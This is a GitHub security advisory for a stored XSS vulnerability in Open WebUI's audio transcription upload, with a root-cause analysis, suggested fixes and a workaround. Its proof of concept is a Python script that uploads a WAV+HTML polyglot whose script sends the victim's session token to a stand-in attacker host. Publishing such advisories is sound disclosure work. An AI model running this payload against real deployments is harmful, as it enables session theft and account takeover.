# [H] Open WebUI has stored XSS via attacker-controlled file extension in /api/v1/audio/transcriptions

## Summary
Severity: High
Advisory: GHSA-m8f9-9whg-f4xr
CVE: CVE-2026-45315
CWE: CWE-434, CWE-646, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-m8f9-9whg-f4xr
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.3

## Details
## Summary                                                                                                                                                

  The audio transcription upload endpoint takes the file extension from the user-supplied filename and saves the file under CACHE_DIR/audio/transcriptions/<uuid>.<ext>. The /cache/{path} route serves these files via FileResponse, which sets Content-Type from the on-disk extension and emits no Content-Disposition. A verified user with the default-on chat.stt permission can upload a polyglot WAV+HTML file named pwn.html and trick any other user into opening the resulting URL — the response comes back as text/html and any embedded <script> runs in the Open WebUI origin.

## Details
  Verified on main @ 8dae237a (v0.9.2):                                                                                                       
  - backend/open_webui/routers/audio.py:1244-1249 — ext = safe_name.rsplit('.', 1)[-1] from user-supplied filename, then filename = f'{id}.{ext}'. No      
  allowlist, no cross-check against file.content_type.                                                                                                   
  - backend/open_webui/main.py:2768-2779 — /cache/{path:path} returns FileResponse(file_path). Starlette derives Content-Type from the filename extension  
  and sets no Content-Disposition.                                                                                                                         
  - backend/open_webui/utils/misc.py:889-921 — strict_match_mime_type defaults to ['audio/*', 'video/webm'], so Content-Type: audio/wav on the upload
  passes regardless of the actual body.                                                                                                                    
  - backend/open_webui/config.py:1482 — USER_PERMISSIONS_CHAT_STT defaults to True.                                                                      
  - src/routes/+layout.svelte (lines 123, 142, 177, 528, 638, …) — JWT lives in localStorage.token, reachable from JS in the origin.                       
  - backend/open_webui/utils/oauth.py:1736-1739 — OAuth token cookie set with httponly=False.                                                              
                                                                                                                                                           
##  PoC                                                                                                                                                      
                                                                                                                                                           
  Tested end-to-end against a harness re-exporting the exact handlers from audio.py and main.py. The cached response was 
  Content-Type: text/html; charset=utf-8 with no Content-Disposition.
  ```python
  import struct, httpx                                                                                                                                   

  data = b'\x80' * 44100                                                                                                                                   
  wav  = struct.pack('<4sI4s4sIHHIIHH4sI',
          b'RIFF', 36 + len(data), b'WAVE',                                                                                                                
          b'fmt ', 16, 1, 1, 44100, 44100, 1, 8,                                                                                                         
          b'data', len(data)) + data                                                                                                                       
  payload = wav + b'<script>alert(document.domain);fetch("https://attacker.example/x?t="+localStorage.token)</script>'
                      
                                                                                                                                                           
  r = httpx.post(                                                                                                                                          
      'https://VICTIM/api/v1/audio/transcriptions',                                                                                                        
      headers={'Authorization': f'Bearer {ATTACKER_JWT}'},                                                                                                 
      files={'file': ('pwn.html', payload, 'audio/wav')},                                                                                                  
  )                                                                                                                                                        
  fn = r.json()['filename']      # '<uuid>.html'
 #Send victim to: https://VICTIM/cache/audio/transcriptions/<fn>                                                                 
```


https://github.com/user-attachments/assets/c263bfcd-b923-4891-9c2f-a01c1faa6408



                                                                                                                                        
##  Impact                                                                                                                                                   
                                                                                                                                                           
  Authenticated stored XSS in the Open WebUI origin, exploitable by any verified user with the default-on chat.stt permission. Triggered by a single click from any other authenticated user. Leads to session-token theft (JWT lives in localStorage and the OAuth cookie is non-HttpOnly), enabling full account takeover of any user — including admins. With an admin token, in-process code execution on the server is theoretically reachable through Open WebUI's existing admin-only plugin mechanism, but that path is out of scope for this report.                                                                   

  Affected: <= 0.9.2.

  Suggested fixes (any one breaks the chain): derive the saved extension from the validated MIME against a fixed audio allowlist; on /cache, force         
  Content-Disposition: attachment and X-Content-Type-Options: nosniff (or restrict served extensions); move JWT to an HttpOnly; SameSite=Lax cookie.
                                                                                                                                                           
  Workaround: set USER_PERMISSIONS_CHAT_STT=False to revoke the upload right from non-admins.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-m8f9-9whg-f4xr
- https://nvd.nist.gov/vuln/detail/CVE-2026-45315
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.3
